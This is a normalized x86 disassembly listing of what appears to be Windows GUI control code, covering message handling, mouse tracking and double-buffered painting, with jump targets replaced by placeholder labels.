mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
mov edx [ ebp - 0x8 ]
cmp eax 0x200
jne r-xdata
sub edx 0x98
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
movsx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_48dac0
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4933e8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_48e800
test al al
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477028
mov ebx eax
test ebx ebx
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x77
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4934ac
test al al
je r-xdata
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0xa ]
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
call sub_432a5c
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_48d98c
call sub_48ac30
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x240 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
test eax eax
je r-xdata
sub edx 0xada4
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
sub edx 0x17
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ebx [ rw-data ]
lea eax [ ebp - 0x10 ]
mov dl 0x1
call sub_48c3fc
mov ebx eax
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb014
call sub_48f2b0
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_477028
mov ebx eax
test ebx ebx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48f3dc
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xfc ]
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x244 ]
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x244 ] edx
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call DefWindowProcW
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x240 ] 0x1
mov [ ebp - 0x28 ] 0x2
mov eax [ ebp - 0x4 ]
call sub_496868
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x2c ] 0x10
lea eax [ ebp - 0x2c ]
push eax
call _TrackMouseEvent
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb047
mov eax ebx
call sub_48f2b0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
cmp eax [ rw-data ]
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
xor ecx ecx
mov edx 0xb014
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_48f2b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x244 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov [ edx + 0x244 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_42e594
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_42e354
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
xor ecx ecx
mov edx 0xb013
call sub_48f2b0
sub_493bd8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x24c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_48f6c0
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageW
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_48f2b0
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x64 ]
mov eax [ eax + 0x18 ]
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x1b8 ]
call sub_46df14
call sub_46cf24
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x1b8 ]
call sub_46df70
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_48db1c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x24c ]
push eax
mov eax [ esi + 0x248 ]
push eax
call CallWindowProcW
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_493ce0
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_48a70c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_48f2b0
mov [ esi + 0xc ] eax
mov bl 0x1
sub_493d14
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_493e73
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call BeginPaint
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_493e36
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
jmp r-xdata
dec edi
je r-xdata
inc ebx
xor esi esi
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_493eb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_493e7a
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call EndPaint
inc esi
dec ebx
jne r-xdata
test [ eax + 0x55 ] 0x8
jne r-xdata
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d4 ]
mov edx esi
call sub_4246e8
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov ecx [ eax + 0x44 ]
add ecx [ eax + 0x4c ]
push ecx
mov edx [ eax + 0x40 ]
mov ecx edx
add ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x44 ]
push ecx
push edx
mov eax [ ebp - 0x10 ]
push eax
call ExcludeClipRect
mov edi eax
cmp edi 0x1
je r-xdata
sub_493e84
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop esi
retn
sub_493eb0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
test eax eax
je r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx ebx
call sub_424744
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d4 ]
mov edx [ ebp - 0xc ]
call sub_4246e8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
dec edi
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
mov edx [ ebp - 0xc ]
call sub_4246e8
mov ebx eax
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0x44 ]
mov eax esi
mov edx [ ebp - 0x18 ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax + 0x40 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
add ecx [ eax + 0x48 ]
mov edx esi
mov eax ebx
call sub_432a2c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_46cf24
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_432a2c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax 0xff000014
call sub_46cf24
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_432a2c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_49405d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x8 ]
call sub_48c490
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x18 ]
call sub_48f2b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x18 ]
or [ eax + 0x54 ] 0x80
test [ ebx + 0x55 ] 0x8
jne r-xdata
sub_494190
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_494224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
push eax
call ExcludeClipRect
call sub_44c2c8
lea ecx [ ebp - 0x18 ]
mov dl 0x2
call sub_44c6fc
mov eax [ ebp - 0x8 ]
push eax
call sub_44c2c8
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_44c490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49422b
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call RestoreDC
retn
sub_49423c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_494475
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_48c490
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor esi esi
xor ebx ebx
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowLongW
test eax 0x800000
je r-xdata
mov ebx 0xa
mov esi 0x200f
jmp r-xdata
cmp ebx 0xa
jne r-xdata
mov ebx 0x3
mov esi 0xa00f
test esi esi
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x4 ]
call sub_48f2b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
push esi
push ebx
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_48c490
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49447c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c25c
test al al
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_494190
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] edx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_494190
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_49423c
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_48c490
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
mov edx esi
call sub_4246e8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_494494
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_493d14
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_492534
test eax eax
jne r-xdata
call sub_41f780
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call BeginPaint
mov esi eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
push eax
push esi
call CreateCompatibleBitmap
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4946e4
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
call CreateCompatibleDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4946ab
push [ fs : ecx ]
mov [ fs : ecx ] esp
push 0x0
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWindowOrgEx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_48f2b0
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_494494
xor eax eax
mov [ ebx + 0x4 ] eax
push 0xcc0020
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x40 ]
sub ecx edx
push ecx
mov ecx [ ebp - 0x44 ]
sub ecx eax
push ecx
push edx
push eax
push esi
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4946b2
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
retn
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call BeginPaint
mov esi eax
xor edx edx
push ebp
push sub_4945c8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax esi
call sub_41d6cc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call EndPaint
retn
xor edx edx
push ebp
push sub_4945a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x4
mov ecx [ ebp - 0x8 ]
mov edx 0x318
mov eax [ ebp - 0x4 ]
call sub_48f2b0
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
or edx 0xffffffff
mov eax [ ebp - 0x14 ]
call sub_41d76c
retn
lea eax [ ebp - 0x4c ]
mov edx eax
mov cl 0xff
mov eax [ ebp - 0x14 ]
call sub_41d7e8
sub_4946b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call EndPaint
mov eax [ ebp - 0x8 ]
push eax
call DeleteDC
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4946f4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494714
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494788
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4947a8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4947c8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4947ec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494810
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_494834
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_493ce0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
